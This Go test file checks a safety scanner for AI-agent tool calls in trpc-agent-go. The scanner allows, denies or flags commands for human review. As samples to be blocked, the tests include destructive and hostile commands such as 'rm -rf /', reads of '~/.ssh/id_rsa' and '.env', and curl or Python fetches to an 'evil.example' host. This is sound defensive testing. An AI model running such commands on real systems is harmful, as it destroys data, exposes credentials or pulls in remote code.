//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestScanRequiredSamples(t *testing.T) {
	policy := DefaultPolicy()
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "safe go test",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "go test ./...",
			},
			decision: DecisionAllow,
		},
		{
			name: "dangerous delete",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "rm -rf /",
			},
			decision: DecisionDeny,
			ruleID:   "dangerous.rm_rf",
		},
		{
			name: "read key",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.path_access",
		},
		{
			name: "non whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://evil.example/install.sh",
			},
			decision: DecisionDeny,
			ruleID:   "network.non_whitelisted_domain",
		},
		{
			name: "whitelist network",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
			},
			decision: DecisionAllow,
		},
		{
			name: "shell wrapper bypass",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "bash -c 'curl https://evil.example/x'",
			},
			decision: DecisionDeny,
			ruleID:   "shell.bypass",
		},
		{
			name: "pipeline command",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "cat README.md | wc -l",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "shell.pipeline_review",
		},
		{
			name: "dependency install",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "npm install left-pad",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "dependency.environment_change",
		},
		{
			name: "long running sleep",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "sleep 9999",
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "resource.long_sleep",
		},
		{
			name: "large output",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "yes x | head -c 9999999",
			},
			decision: DecisionDeny,
			ruleID:   "resource.large_output",
		},
		{
			name: "hostexec long session",
			req: Request{
				ToolName:   "exec_command",
				Backend:    BackendHostExec,
				Command:    "tail -f app.log",
				TTY:        true,
				Background: true,
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "hostexec.long_session",
		},
		{
			name: "ask human review",
			req: Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "python -c 'import subprocess; subprocess.run([\"go\", \"test\", \"./...\"])'",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "import subprocess; subprocess.run(['go', 'test', './...'])",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "codeexec.host_command_bridge",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, policy)
			if report.Decision != tt.decision {
				t.Fatalf("decision = %q, want %q; report: %+v",
					report.Decision, tt.decision, report)
			}
			if tt.ruleID != "" && report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
			if err := ValidateReport(report); err != nil {
				t.Fatalf("report missing required fields: %v", err)
			}
		})
	}
}

func TestLoadPolicyChangesNetworkAllowlistWithoutCode(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
network_allowlist:
  - example.com
denied_paths:
  - .env
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://example.com/file",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl https://api.github.com/repos/x/y",
	}, policy)
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisablePipelineReview(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.yaml")
	content := []byte(`
review_shell_pipelines: false
allowed_commands:
  - cat
  - wc
`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("decision = %q, want allow; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyCanDisableParseErrorDeny(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "tool_safety_policy.json")
	content := []byte(`{
  "deny_on_parse_error": false,
  "allowed_commands": ["echo"]
}`)
	if err := os.WriteFile(path, content, 0o600); err != nil {
		t.Fatal(err)
	}
	policy, err := LoadPolicy(path)
	if err != nil {
		t.Fatal(err)
	}
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo 'unterminated",
	}, policy)
	if report.Decision != DecisionAsk || report.RuleID != "shellsafe.parse_error" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestPolicyZeroValueKeepsConservativeDefaults(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, Policy{})
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "shell.pipeline_review" {
		t.Fatalf("zero-value policy should inherit pipeline review: %+v", report)
	}
}

func TestDefaultPolicyPreservesProgrammaticFalseOverrides(t *testing.T) {
	policy := DefaultPolicy()
	policy.ReviewShellPipelines = false
	policy.DenyOnParseError = false

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat README.md | wc -l",
	}, policy)
	if report.Decision != DecisionAllow {
		t.Fatalf("pipeline decision = %q, want allow; report: %+v", report.Decision, report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo 'unterminated",
	}, policy)
	if report.Decision != DecisionAsk {
		t.Fatalf("parse decision = %q, want ask; report: %+v", report.Decision, report)
	}
}

func TestLoadPolicyErrors(t *testing.T) {
	if _, err := LoadPolicy(filepath.Join(t.TempDir(), "missing.yaml")); err == nil {
		t.Fatal("LoadPolicy missing file error = nil")
	}

	badJSON := filepath.Join(t.TempDir(), "bad.json")
	if err := os.WriteFile(badJSON, []byte(`{`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(badJSON); err == nil {
		t.Fatal("LoadPolicy bad JSON error = nil")
	}

	badExt := filepath.Join(t.TempDir(), "policy.toml")
	if err := os.WriteFile(badExt, []byte(`allowed_commands = []`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadPolicy(badExt); err == nil {
		t.Fatal("LoadPolicy unsupported extension error = nil")
	}
}

func TestPermissionPolicyBlocksAndAudits(t *testing.T) {
	args := []byte(`{"command":"cat .env","timeout_sec":10}`)
	var audit bytes.Buffer
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(&audit))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(audit.Bytes()), &event); err != nil {
		t.Fatalf("audit was not json: %v\n%s", err, audit.String())
	}
	if event.ToolName != "workspace_exec" ||
		event.Decision != DecisionDeny ||
		event.RuleID != "sensitive.path_access" ||
		!event.Blocked {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyMapsReviewToAsk(t *testing.T) {
	args := []byte(`{"command":"npm install left-pad"}`)
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAsk {
		t.Fatalf("action = %q, want ask", decision.Action)
	}
}

func TestPermissionPolicyAllowsUnknownToolAndNilRequest(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("nil request action = %q, want allow", decision.Action)
	}

	decision, err = policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "unknown_tool",
		Arguments: []byte(`{}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("unknown tool action = %q, want allow", decision.Action)
	}
}

func TestPermissionPolicyInvalidArgsDeny(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "invalid args") {
		t.Fatalf("unexpected decision: %+v", decision)
	}
}

func TestPermissionPolicyAuditPath(t *testing.T) {
	path := filepath.Join(t.TempDir(), "audit.jsonl")
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditPath(path))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"cat .env"}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(b), &event); err != nil {
		t.Fatalf("audit file was not json: %v\n%s", err, string(b))
	}
	if event.RuleID != "sensitive.path_access" {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestPermissionPolicyAuditWriterError(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditWriter(errorWriter{}))
	_, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err == nil {
		t.Fatal("CheckToolPermission audit writer error = nil")
	}
}

func TestNilPermissionPolicyFailsClosed(t *testing.T) {
	var policy *PermissionPolicy
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("action = %q, want deny", decision.Action)
	}
}

func TestPermissionPolicyAllowsNullCodeBlocksNoop(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":null}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("action = %q, want allow", decision.Action)
	}
}

func TestPermissionPolicyAllowsCodeExecBlocksAndDeniesBadBlocks(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":[{"language":"python","code":"print(1)"}]}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionAllow {
		t.Fatalf("valid code block action = %q, want allow", decision.Action)
	}

	decision, err = policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: []byte(`{"code_blocks":42}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if decision.Action != tool.PermissionActionDeny ||
		!strings.Contains(decision.Reason, "code_blocks") {
		t.Fatalf("bad code block decision = %+v, want deny with code_blocks reason", decision)
	}
}

func TestRequestFromPermissionRequestParsesExecMetadata(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName: "exec_command",
		Arguments: []byte(`{
			"command":"go test ./...",
			"workdir":"/tmp/work",
			"env":{"PATH":"/bin"},
			"background":true,
			"timeoutSec":12,
			"pty":true
		}`),
		Metadata: tool.ToolMetadata{Destructive: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.Backend != BackendHostExec || req.Cwd != "/tmp/work" ||
		req.TimeoutSeconds != 12 || !req.Background || !req.TTY ||
		!req.Metadata.Destructive || req.Env["PATH"] != "/bin" {
		t.Fatalf("unexpected request: %+v", req)
	}
}

func TestRequestFromPermissionRequestParsesTTYAndTimeoutSec(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName: "workspace_exec",
		Arguments: []byte(`{
			"command":"go test ./...",
			"cwd":".",
			"timeout_sec":7,
			"tty":true
		}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.Backend != BackendWorkspaceExec || req.Cwd != "." ||
		req.TimeoutSeconds != 7 || !req.TTY {
		t.Fatalf("unexpected request: %+v ok=%v", req, ok)
	}
}

func TestRequestFromPermissionRequestUsesDeclarationName(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		Declaration: &tool.Declaration{Name: "workspace_exec"},
		Arguments:   []byte(`{"command":"go test ./...","cwd":"."}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if !ok || req.ToolName != "workspace_exec" || req.Command != "go test ./..." ||
		req.Cwd != "." || req.Backend != BackendWorkspaceExec {
		t.Fatalf("unexpected request: %+v ok=%v", req, ok)
	}
}

func TestParseCodeBlocksVariants(t *testing.T) {
	blocks, err := parseCodeBlocks(json.RawMessage(`{"language":"python","code":"print(1)"}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(blocks) != 1 || blocks[0].Language != "python" {
		t.Fatalf("unexpected object blocks: %+v", blocks)
	}

	inner := `[{"language":"bash","code":"echo ok"}]`
	blocks, err = parseCodeBlocks(json.RawMessage(strconvQuote(inner)))
	if err != nil {
		t.Fatal(err)
	}
	if len(blocks) != 1 || blocks[0].Language != "bash" {
		t.Fatalf("unexpected string blocks: %+v", blocks)
	}

	if _, err := parseCodeBlocks(json.RawMessage(`"not-json"`)); err == nil {
		t.Fatal("parseCodeBlocks invalid string error = nil")
	}
	if _, err := parseCodeBlocks(json.RawMessage(`42`)); err == nil {
		t.Fatal("parseCodeBlocks scalar error = nil")
	}
	if _, err := parseCodeBlocks(json.RawMessage(`[{"language":42}]`)); err == nil {
		t.Fatal("parseCodeBlocks malformed array error = nil")
	}
}

func TestScanRedactsSecrets(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo OPENAI_API_KEY=sk-1234567890abcdef",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny {
		t.Fatalf("decision = %q, want deny", report.Decision)
	}
	if !report.Redacted {
		t.Fatalf("report should indicate redaction")
	}
	raw, _ := json.Marshal(report)
	if bytes.Contains(raw, []byte("sk-1234567890abcdef")) {
		t.Fatalf("report leaked secret: %s", raw)
	}
}

func TestScanMetadataEnvAndTelemetry(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
		Metadata: ToolMetadata{Destructive: true},
		Env: map[string]string{
			"PATH":    "/bin",
			"BAD_ENV": "1",
		},
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "tool.metadata_destructive" {
		t.Fatalf("unexpected report: %+v", report)
	}
	attrs := report.SpanAttributes()
	if attrs["tool.safety.decision"] != string(report.Decision) ||
		attrs["tool.safety.risk_level"] != string(report.RiskLevel) ||
		attrs["tool.safety.rule_id"] != report.RuleID ||
		attrs["tool.safety.backend"] != report.Backend {
		t.Fatalf("unexpected span attrs: %+v", attrs)
	}
	if len(report.Findings) < 2 {
		t.Fatalf("expected metadata and env findings: %+v", report.Findings)
	}
}

func TestValidateReportMissingFields(t *testing.T) {
	tests := []struct {
		name   string
		report Report
		want   string
	}{
		{
			name:   "decision",
			report: Report{},
			want:   "missing decision",
		},
		{
			name:   "risk",
			report: Report{Decision: DecisionAllow},
			want:   "missing risk_level",
		},
		{
			name: "rule",
			report: Report{
				Decision:       DecisionDeny,
				RiskLevel:      RiskHigh,
				Recommendation: "fix it",
			},
			want: "missing rule_id",
		},
		{
			name: "evidence",
			report: Report{
				Decision:       DecisionDeny,
				RiskLevel:      RiskHigh,
				RuleID:         "rule",
				Recommendation: "fix it",
			},
			want: "missing evidence",
		},
		{
			name: "recommendation",
			report: Report{
				Decision:  DecisionAllow,
				RiskLevel: RiskLow,
			},
			want: "missing recommendation",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateReport(tt.report)
			if err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("ValidateReport() error = %v, want %q", err, tt.want)
			}
		})
	}
}

func TestScanDeniedCWD(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "ls",
		Cwd:      "~/.ssh",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanDeniedRootPath(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
		Cwd:      "/",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.cwd_access" {
		t.Fatalf("root cwd should be denied: %+v", report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "cat /",
	}, DefaultPolicy())
	if report.Decision != DecisionDeny || report.RuleID != "sensitive.path_access" {
		t.Fatalf("root path argument should be denied: %+v", report)
	}
}

func TestScanAdditionalRuleBranches(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		ruleID string
	}{
		{
			name:   "recursive chmod",
			cmd:    "chmod -R 777 .",
			ruleID: "dangerous.recursive_chmod",
		},
		{
			name:   "network command without target",
			cmd:    "curl --head",
			ruleID: "network.unresolved_target",
		},
		{
			name:   "python large output",
			cmd:    "python -c 'print(\"x\" * 9999999)'",
			ruleID: "resource.large_output",
		},
		{
			name:   "parallel high concurrency",
			cmd:    "parallel -j 64 echo ::: a b c",
			ruleID: "resource.high_concurrency",
		},
		{
			name:   "infinite loop",
			cmd:    "for ;; do echo x; done",
			ruleID: "resource.infinite_loop",
		},
		{
			name:   "windows system path delete",
			cmd:    "rm -r C:/Windows",
			ruleID: "dangerous.rm_rf",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tt.cmd,
			}, DefaultPolicy())
			if report.RuleID != tt.ruleID {
				t.Fatalf("rule id = %q, want %q; report: %+v",
					report.RuleID, tt.ruleID, report)
			}
		})
	}
}

func TestScanCodeExecAppliesRequestEnvelope(t *testing.T) {
	tests := []struct {
		name     string
		req      Request
		decision Decision
		ruleID   string
	}{
		{
			name: "denied cwd",
			req: Request{
				ToolName: "execute_code",
				Backend:  BackendCodeExec,
				Cwd:      "/",
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "sensitive.cwd_access",
		},
		{
			name: "timeout exceeded",
			req: Request{
				ToolName:       "execute_code",
				Backend:        BackendCodeExec,
				TimeoutSeconds: DefaultPolicy().MaxTimeoutSeconds + 1,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "resource.timeout_exceeded",
		},
		{
			name: "output exceeded",
			req: Request{
				ToolName:       "execute_code",
				Backend:        BackendCodeExec,
				MaxOutputBytes: DefaultPolicy().MaxOutputBytes + 1,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionDeny,
			ruleID:   "resource.output_limit_exceeded",
		},
		{
			name: "background",
			req: Request{
				ToolName:   "execute_code",
				Backend:    BackendCodeExec,
				Background: true,
				CodeBlocks: []CodeBlock{{
					Language: "python",
					Code:     "print(1)",
				}},
			},
			decision: DecisionNeedsHumanReview,
			ruleID:   "process.background",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := Scan(tt.req, DefaultPolicy())
			if report.Decision != tt.decision || report.RuleID != tt.ruleID {
				t.Fatalf("unexpected report: %+v", report)
			}
		})
	}
}

func TestScanCodeExecShellAndNonShellBranches(t *testing.T) {
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "bash",
			Code:     "go test ./...",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("bash code block should be allowed: %+v", report)
	}

	report = Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     "import urllib.request; urllib.request.urlopen('https://evil.example')",
		}},
	}, DefaultPolicy())
	if report.Decision != DecisionDeny ||
		report.RuleID != "network.non_whitelisted_domain" {
		t.Fatalf("python network code block should be denied: %+v", report)
	}
}

func TestScanHighConcurrencyNeedsReview(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "printf jobs | xargs -P 64 -n 1 echo",
	}, DefaultPolicy())
	if report.Decision != DecisionNeedsHumanReview ||
		report.RuleID != "resource.high_concurrency" {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestScanFiveHundredCommandsUnderOneSecond(t *testing.T) {
	command := strings.Repeat("go test ./...\n", 500)
	start := time.Now()
	report := Scan(Request{
		ToolName: "execute_code",
		Backend:  BackendCodeExec,
		CodeBlocks: []CodeBlock{{
			Language: "python",
			Code:     command,
		}},
	}, DefaultPolicy())
	elapsed := time.Since(start)
	if elapsed > time.Second {
		t.Fatalf("scan took %s, want <= 1s", elapsed)
	}
	if report.Decision != DecisionAllow {
		t.Fatalf("unexpected report: %+v", report)
	}
}

func TestAuditHelpersHandleNoopAndErrors(t *testing.T) {
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
	}, DefaultPolicy())
	if err := WriteAuditJSONL(nil, report); err != nil {
		t.Fatalf("WriteAuditJSONL(nil) error = %v", err)
	}
	if err := AppendAuditFile("", report); err != nil {
		t.Fatalf("AppendAuditFile(empty) error = %v", err)
	}
	missingParent := filepath.Join(t.TempDir(), "missing", "audit.jsonl")
	if err := AppendAuditFile(missingParent, report); err == nil {
		t.Fatal("AppendAuditFile missing parent error = nil")
	}
}

func TestPermissionReasonWithoutEvidence(t *testing.T) {
	reason := permissionReason(Report{
		Decision:       DecisionDeny,
		Recommendation: "provide a command",
	})
	if !strings.Contains(reason, "tool safety guard deny") ||
		!strings.Contains(reason, "provide a command") {
		t.Fatalf("unexpected reason: %q", reason)
	}
}

func TestContainsPipelineIgnoresQuotedSeparators(t *testing.T) {
	if containsPipeline(`echo "a|b"`) {
		t.Fatal("double-quoted pipe should not count as pipeline")
	}
	if containsPipeline(`echo 'a;b'`) {
		t.Fatal("single-quoted semicolon should not count as pipeline")
	}
	if !containsPipeline("go test ./... && go vet ./...") {
		t.Fatal("&& should count as a command chain")
	}
}

func TestWriteAuditJSONLWritesOneRecord(t *testing.T) {
	var w countingWriter
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
	}, DefaultPolicy())
	if err := WriteAuditJSONL(&w, report); err != nil {
		t.Fatal(err)
	}
	if w.calls != 1 {
		t.Fatalf("Write calls = %d, want 1", w.calls)
	}
	if !bytes.HasSuffix(w.data, []byte("\n")) {
		t.Fatalf("audit record should end with newline: %q", w.data)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(w.data), &event); err != nil {
		t.Fatalf("audit record was not json: %v\n%s", err, string(w.data))
	}
	if event.Decision != DecisionAllow || event.ToolName != "workspace_exec" {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

type countingWriter struct {
	calls int
	data  []byte
}

type errorWriter struct{}

func (errorWriter) Write([]byte) (int, error) {
	return 0, errors.New("write failed")
}

func strconvQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func (w *countingWriter) Write(p []byte) (int, error) {
	w.calls++
	w.data = append(w.data, p...)
	return len(p), nil
}
